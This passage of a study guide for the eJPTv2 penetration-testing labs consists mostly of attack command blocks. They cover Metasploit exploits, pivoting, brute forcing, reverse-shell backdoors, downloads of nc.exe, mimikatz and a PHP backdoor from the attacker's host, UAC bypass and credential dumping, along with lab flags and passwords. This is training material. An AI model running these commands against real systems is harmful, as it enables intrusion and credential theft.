getuid ; sysinfo ; cat C:\Users\Administrator\Documents\FLAG1.txt
shell ; ping 10.0.28.125

run autoroute -s 10.0.28.125/20
use auxiliary/server/socks_proxy ; set SRVPORT 9050 ; set VERSION 4a ; exploit ; jobs
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
sessions -i 1 ; shell
net view 10.0.28.125 ; migrate -N explorer.exe
net use D: \\10.0.28.125\Documents ; net use K: \\10.0.28.125\K$
dir D: ; cat D:\Confidential.txt ; cat D:\FLAG2.txt
```

### Lab S2 — SNMP Analysis
**Tools:** ping, nmap, snmpwalk, hydra, MSF (psexec)
```bash
nmap -sU -p 161 demo.ine.local
nmap -sU -p 161 --script=snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
use exploit/windows/smb/psexec ; set RHOSTS demo.ine.local ; set SMBUSER administrator ; set SMBPASS elizabeth ; exploit
shell ; cd C:\ ; dir ; type FLAG1.txt
```

### Lab S3 — DNS & SMB Relay Attack
**Tools:** MSF (smb_relay), dnsspoof, arpspoof — see PART F1 for the full command block.

### Lab S4 — T1046 Network Service Scanning (XODA → pivot)
**Tools:** ping, nmap, curl, MSF (xoda_file_upload, portscan/tcp), bash, static nmap
```bash
curl demo1.ine.local
use exploit/unix/webapp/xoda_file_upload ; set RHOSTS demo1.ine.local ; set TARGETURI / ; set LHOST 192.63.4.2 ; exploit
shell ; ip addr
run autoroute -s 192.180.108.2
use auxiliary/scanner/portscan/tcp ; set RHOSTS 192.180.108.3 ; set verbose false ; set ports 1-1000 ; exploit
# then upload static nmap + bash-port-scanner.sh (see PART E5) and scan 192.180.108.3
```
**LAB FACT:** XODA file-upload → meterpreter → 2nd NIC 192.180.108.2 → autoroute /24 → 192.180.108.3 open 21/22/80.

### Lab S5 — Apache Enumeration (10 HTTP modules)
**Tools:** ping, MSF HTTP auxiliary modules, wget — full 10-module block in PART B3.

### Lab S6 — Postfix Recon
**Tools:** nmap, nc, telnet, smtp-user-enum, MSF (smtp_enum), sendemail — see PART B6.

### Lab S7 — Vulnerable SSH Server (libssh bypass)
```bash
nmap -sS -sV demo.ine.local
use auxiliary/scanner/ssh/libssh_auth_bypass ; set RHOSTS demo.ine.local ; set SPAWN_PTY true ; exploit ; sessions -i 1
```

### Lab S8 — Banner Grabbing
```bash
ifconfig ; nmap -sV -O 192.8.94.3 ; nmap -sV --script=banner 192.8.94.3 ; nc 192.8.94.3 22
```

### Lab S9 — Vulnerability Scanning with Nmap Scripts (Shellshock)
```bash
nmap -sV -O 192.152.25.3
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
ls -al /usr/share/nmap/scripts | grep vuln
```

### Lab S10 — Fixing Exploits (HFS 2.3 public exploit)
```bash
searchsploit HTTP File Server 2.3 ; searchsploit -m 39161 ; vim 39161.py
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
python -m SimpleHTTPServer 80 ; nc -nvlp 1234 ; python 39161.py demo.ine.local 80
```

### Lab S11–S13 — Bind Shells / Netcat Fundamentals / Reverse Shells
**Tools:** python, certutil, netcat — see PART C3. Key transfer: `certutil -urlcache -f http://<Kali_IP>/nc.exe nc.exe`.

### Lab S14 — Targeting vsFTPd
```bash
nmap -sV -sC -p 21 demo.ine.local
ftp demo.ine.local 21                  # anonymous/anonymous
searchsploit vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS demo.ine.local ; run   # patched → fails
hydra -L .../unix_users.txt -P .../unix_passwords.txt demo.ine.local ftp
ftp demo.ine.local 21                  # login: service / service
```

### Lab S15 — Targeting SAMBA (usermap_script)
```bash
nmap -sV -p 445 demo.ine.local
use auxiliary/scanner/smb/smb_version ; set RHOSTS demo.ine.local ; run     # Samba 3.0.20
searchsploit samba 3.0.20
use exploit/multi/samba/usermap_script ; set RHOSTS demo.ine.local ; exploit ; whoami
```

---

## LINUX ENUMERATION & PRIVESC LABS

### Lab L1 — Automating Linux Local Enumeration
**Target:** Ubuntu 14.04.6 / Apache 2.4.6:80 · **Foothold:** ShellShock (`apache_mod_cgi_bash_env_exec`)
```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec ; set RHOSTS demo.ine.local ; set TARGETURI /gettime.cgi ; set LHOST 192.58.2.2 ; exploit
background
use post/linux/gather/enum_configs  ; set SESSION 1 ; run
use post/linux/gather/enum_network  ; set SESSION 1 ; run ; cat /root/.msf4/loot/<file>.txt
use post/linux/gather/enum_system   ; set SESSION 1 ; run
# LinEnum:
cd /tmp ; upload /root/Desktop/LinEnum.sh ; shell ; /bin/bash -i ; chmod +x LinEnum.sh ; ./LinEnum.sh
```
**Flag:** none (enumeration lab).

### Lab L2 — Web Server With Python
```bash
python -m SimpleHTTPServer 80    # host files; verify by browsing Kali's IP
```

### Lab L3 — Transferring Files To Windows (HFS 2.3)
```bash
searchsploit rejetto
use exploit/windows/http/rejetto_hfs_exec ; set RHOSTS demo.ine.local ; exploit
cd /usr/share/windows-resources/mimikatz/x64 ; python3 -m http.server 80
# target: cd C:\ ; mkdir Temp ; cd Temp ; shell ; certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
```

### Lab L4 — Transferring Files To Linux (SambaCry)
```bash
use exploit/linux/samba/is_known_pipename ; set RHOSTS demo.ine.local ; exploit
cd /usr/share/webshells/php/ ; python3 -m http.server 80
# target: wget http://192.217.117.2/php-backdoor.php
```

### Lab L5 — Upgrading Non-Interactive Shells
```bash
use exploit/linux/samba/is_known_pipename ; set RHOSTS demo.ine.local ; exploit
/bin/bash -i ; python -c 'import pty; pty.spawn("/bin/bash")'
```

### Lab L6 — Windows: PrivescCheck (WinLogon creds)
```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
runas.exe /user:administrator cmd        # password: hello_123321
# Kali: use exploit/windows/misc/hta_server ; exploit
# Victim: mshta.exe http://10.10.31.2:8080/<rand>.hta
sessions -i 1 ; cat C:\Users\Administrator\Desktop\flag.txt
```
**Creds:** `administrator:hello_123321` · **Flag:** `2b070a650a92129c2462deae7707b0c5`

### Lab L7 — Linux Privesc: Permissions Matter! (world-writable /etc/shadow)
```bash
# web terminal at http://target.ine.local:8000
find / -not -type l -perm -o+w
ls -l /etc/shadow ; cat /etc/shadow
openssl passwd -1 -salt abc password     # generate hash
vim /etc/shadow                          # paste into root's record
su                                       # password: password
cd /root ; cat flag
```
**Root pw set to:** `password` · **Flag:** `e62ab67ddff744d60cbb6232feaefc4d`

### Lab L8 — Editing Gone Wrong (sudo man → shell escape)
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
sudo -l                                  # NOPASSWD: /usr/bin/man
sudo man ls
!/bin/bash                               # GTFOBins pager escape → root
cd /root ; cat flag
```
**Flag:** `74f5cc752947ec8a522f9c49453b8e9a`

---

## WINDOWS EXPLOITATION LABS

### Lab W1 — IIS WebDav (Metasploit)
**Service:** WebDAV `/webdav`, basic auth `bob:password_123321`
```bash
nmap --script http-enum -sV -p 80 demo.ine.local
dirb demo.ine.local
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local ; set HttpUsername bob ; set HttpPassword password_123321 ; set PATH /webdav/metasploit%RAND%.asp ; exploit
shell ; cd / ; dir ; type flag.txt
```
**Flag:** `d3aff16a801b4b7d36b4da1094bee345`

### Lab W2 — SMB Server PSexec
```bash
nmap -p445 --script smb-protocols demo.ine.local
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set USER_FILE .../common_users.txt; set PASS_FILE .../unix_passwords.txt; set RHOSTS demo.ine.local; set VERBOSE false; exploit"
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS demo.ine.local; set SMBUser Administrator; set SMBPass <password>; exploit"
```
**Flag:** not shown in source.

### Lab W3 — Insecure RDP Service (port 3333)
```bash
use auxiliary/scanner/rdp/rdp_scanner ; set RHOSTS demo.ine.local ; set RPORT 3333 ; exploit
hydra -L .../common_users.txt -P .../unix_passwords.txt rdp://demo.ine.local -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
```
**Flag:** `port-number-3333` (read from `C:\flag`).

### Lab W4 — WinRM Exploitation (port 5985)
```bash
nmap --top-ports 7000 demo.ine.local
use auxiliary/scanner/winrm/winrm_login ; set RHOSTS demo.ine.local ; set USER_FILE .../common_users.txt ; set PASS_FILE .../unix_passwords.txt ; set VERBOSE false ; exploit
use auxiliary/scanner/winrm/winrm_cmd ; set RHOSTS demo.ine.local ; set USERNAME administrator ; set PASSWORD tinkerbell ; set CMD whoami ; exploit
use exploit/windows/winrm/winrm_script_exec ; set RHOSTS demo.ine.local ; set USERNAME administrator ; set PASSWORD tinkerbell ; set FORCE_VBS true ; exploit
cd / ; dir ; cat flag.txt
```
**Flag:** `3c716f95616eec677a7078f92657a230`

### Lab W5 — UAC Bypass: UACMe (HFS 2.3 foothold)
```bash
use exploit/windows/http/rejetto_hfs_exec ; set RHOSTS demo.ine.local ; exploit
ps -S explorer.exe ; migrate <PID> ; getsystem
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
cd C:\Users\admin\AppData\Local\Temp ; upload Akagi64.exe . ; upload /root/backdoor.exe .
# second terminal: multi/handler (LHOST 10.10.31.2 LPORT 4444)
shell ; Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
ps -S lsass.exe ; migrate <lsass_PID> ; hashdump
```
**Admin NTLM:** `4d6583ed4cef81c2f2ac3c88fc5f3da6`

### Lab W6 — Privilege Escalation: Impersonate (incognito)
```bash
use exploit/windows/http/rejetto_hfs_exec ; set RHOSTS demo.ine.local ; exploit
load incognito ; list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid ; cat C:\Users\Administrator\Desktop\flag.txt
```
**Flag:** `x28c832a39730b7d46d6c38f1ea18e12`

### Lab W7 — Unattended Installation (Unattend.xml)
```bash
. .\PowerUp.ps1 ; Invoke-PrivescAudit ; cat C:\Windows\Panther\Unattend.xml
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))  # Admin@123
runas.exe /user:administrator cmd        # Admin@123
# HTA: (Kali) use exploit/windows/misc/hta_server ; exploit  (Target) mshta.exe http://10.10.31.2:8080/<rand>.hta
sessions -i 1 ; cd C:\Users\Administrator\Desktop ; cat flag.txt
```
**Decoded pw:** `Admin@123` · **Flag:** `097ab83639dce0ab3429cb0349493f60`

### Lab W8 — Meterpreter: Kiwi Extension (BadBlue 2.7)
```bash
searchsploit badblue 2.7
use exploit/windows/http/badblue_passthru ; set RHOSTS demo.ine.local ; exploit
migrate -N lsass.exe ; load kiwi ; creds_all ; lsa_dump_sam ; lsa_dump_secrets
```
**Admin NTLM:** `e3c61a68f1b89ee6c8ba9507378dc88d` · **Student NTLM:** `bd4ca1fbe028f3c5066467a7f6a73b0b` · **Syskey:** `377af0de68bdc918d22c57a263d38326`

---

## 15. LAB → TECHNIQUE QUICK MAP

| Lab | Service | Technique | Key command |
|---|---|---|---|
| Firewalled host | — | force scan | `nmap -Pn` |
| XODA pivot | HTTP | file upload + autoroute | `xoda_file_upload`, `run autoroute` |
| FTP enum | FTP | brute + anon | `ftp_login`, `ftp_version` |
| vsftpd | FTP | backdoor / brute | `vsftpd_234_backdoor` |
| Samba recon | SMB | null session enum | `enum4linux -a`, `smbclient -L -N` |
| Samba skillcheck | SMB | hidden shares + brute | shares.txt loop, `smb_login` |
| Samba usermap | SMB | usermap_script | `usermap_script` |
| SambaCry | SMB | is_known_pipename | `is_known_pipename` |
| NetBIOS hacking | SMB | psexec + pivot | `psexec`, `socks_proxy` |
| SMB psexec (Win) | SMB | brute + psexec | `smb_login` + `psexec` |
| Apache enum | HTTP | MSF http modules | 10× `http_*` |
| WebDAV (Win) | IIS | ASP upload | `iis_webdav_upload_asp` / manual |
| HFS | HTTP | rejetto exploit | `rejetto_hfs_exec` |
| BadBlue | HTTP | passthru + kiwi | `badblue_passthru`, `load kiwi` |
| Shellshock | HTTP/CGI | env injection | `apache_mod_cgi_bash_env_exec` |
| MySQL enum | MySQL | login + dump | `mysql_login`, `mysql_hashdump` |
| SSH login | SSH | brute | `ssh_login` |
| Vulnerable SSH | SSH | libssh bypass | `libssh_auth_bypass` |
| Postfix recon | SMTP | VRFY enum | `smtp-user-enum`, `smtp_enum` |
| SNMP analysis | SNMP | community string | `snmpwalk -c public` |
| Insecure RDP | RDP | non-default brute | `rdp_scanner` + Hydra + `xfreerdp` |
| WinRM | WinRM | script_exec | `winrm_script_exec FORCE_VBS` |
| UAC bypass | HFS | UACMe method 23 | `Akagi64.exe 23 <payload>` |
| Impersonate | HFS | incognito tokens | `impersonate_token` |
| Unattend.xml | privesc | answer-file creds | `Invoke-PrivescAudit` |
| PrivescCheck | privesc | WinLogon creds | `Invoke-PrivescCheck` |
| Permissions Matter | Linux | world-writable shadow | `openssl passwd` + `su` |
| Editing Gone Wrong | Linux | sudo man escape | `sudo man ls` → `!/bin/bash` |
| DNS/SMB relay | network | MitM | `smb_relay`, `arpspoof` |
| Banner grab | any | nc/nmap banner | `nc <t> 22` |
| Fixing exploits | HTTP | searchsploit + edit | `searchsploit -m 39161` |
| Bind/reverse shells | any | netcat | `nc -nvlp`, `nc -e` |

---

## 16. EXAM STRATEGY & TIPS

- **Practice pivoting hands-on** — highest-leverage skill. Prefer `autoroute` over SOCKS for stability.
- **Try default creds first** (root/blank, admin/admin) before brute forcing.
- **Don't panic on Q1.** Start with `ip -br a`, `route`, map the network.
- **Hydra can't do SMBv2+** — it falls back to SMBv1 and fails. Use MSF `smb_login`.
- **Old webshells break on modern IIS** — keep a 10-line custom ASP shell ready (see B4).
- **Can't reach a site?** Add it to `/etc/hosts`.
- **Cap rabbit-holes at ~30 min.** Move on, come back.
- **48 hours is plenty** if methodical. Sleep.
- **Read each question carefully** — the answer may be a fact (port/username), not a file flag.
- **Always full-scan (`-p-`)** — services hide on odd ports.

---

## 17. FLAG FORMATS

- MD5 hash (32 hex chars) — most common: `0cc175b9c0f1b6a831c399e269772661`
- Wrapped: `FLAG1{md5hash}` — submit only the hash inside
- Plain fact — a port number, username, or password (e.g. RDP lab flag was `3333`)
- File contents — `type flag.txt` / `cat /flag`

---

*End of master README. All commands, lab facts, credentials, and flags are drawn from the compiled
eJPTv2 study materials. Tool syntax (sqlmap, hashcat modes, MSF module paths) can shift between
versions — verify against current docs / `--help` on your own Kali when in doubt.*
